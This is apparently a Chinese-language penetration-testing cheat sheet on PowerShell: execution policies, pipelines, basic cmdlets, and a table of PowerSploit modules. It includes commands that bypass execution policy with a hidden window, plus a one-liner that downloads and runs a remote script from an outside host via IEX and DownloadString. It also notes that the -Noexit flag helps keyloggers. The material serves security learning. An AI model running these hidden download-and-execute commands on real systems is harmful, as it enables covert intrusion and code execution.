# PowerShell安全

## 执行策略

在PowerShell无法执行时，可以使用以下命令查看执行策略

```
get-executionpolicy
```

查寻结果如图

| 结果         | 说明                                         |
| ------------ | -------------------------------------------- |
| Restricted   | 脚本不能运行(Default)                        |
| RemoteSigned | 本地脚本可执行，远程脚本需要有签名才可以执行 |
| AllSigned    | 脚本需要由受信任的发布者签名才可以运行       |
| Unrestricted | 允许所有的脚本运行                           |

可以使用一下cmdlet来设置PowerShell执行策略

```cmdlet
set-executionpolicy <policy-name>
```

## PowerShell管道

管道的作用时将一个命令的输出作为另一个命令的输入，两个命令之间用管道符号`|`连接

**Example**

停止当前所有以`p`开头的进程

```
get-process p* | stop-process
```

## 常用命令

### 基本知识

| 描述     | 指令 |
| -------- | ----------------------------------------- |
| 新建目录 | new-item <dirname> -itemtype directory |
| 新建文件 | new-item <filename> -itemtype file |
| 删除目录 | remove-item <dirname> |
| 显示文本内容 | get-content <filename> |
| 设置文本内容 | set-content <filename> -value "<content>" |
| 追加内容 | add-content <filename> -value "<content>" |
| 清除内容 | clear-content <filename> |

### 常用命令

#### 绕过本地权限执行

```
Powershell.exe -ExecutionPolicy Bypass -File <name>.ps1
```

#### 本地隐藏绕过权限执行脚本

```
Powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile -File <name>.ps1
```

#### 用IEX下载远程PS1脚本绕过(bug)

```
Powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile IEX (New-Object System.Net.Webclient).DownloadString('http://www.e-wolf.top/2.ps1')
```

#### 参数说明

- ExecutionPolicy Bypass : 绕过执行安全策略，这个参数非常重要，在默认情况下，PowerShell的安全策略规定了PowerShell不允许运行命令和文件。通过设置这个参数，可以绕过任意一个安全规则。在渗透测试中，基本每一次运行PowerShell脚本时都要使用这个参数。
- WindowStyle Hidden ： 隐藏窗口
- NoLogo : 启动不显示版权标志的PowerShell
- NonInteractive (-Nonl) : 非交互模式，PowerShell不为用户提供交互的提示
- NoProfile (-Nop): PowerShell控制台不加载当前用户的配置文件
- Noexit : 执行后不退出Shell。这在使用键盘记录等脚本时非常重要。
- PowerShell脚本在默认情况下无法直接运行，这时就可以使用上述三种方法绕过安全策略，运行PowerShell脚本。

# PowerSploit

## 模块介绍

| 模块               | 功能                       |
| ------------------ | -------------------------- |
| AntivirusBypass    | 发现杀毒软件的查杀特征     |
| CodeExecution      | 在目标主机上执行代码       |
| Exfiltration       | 目标主机上的信息收集工具   |
| Mayhem             | 蓝屏等破坏性脚本           |
| Persistence        | 后门脚本                   |
| Recon              | 以目标主机为跳板刺探信息   |
| ScriptModification | 在目标主机上创建或修改脚本 |



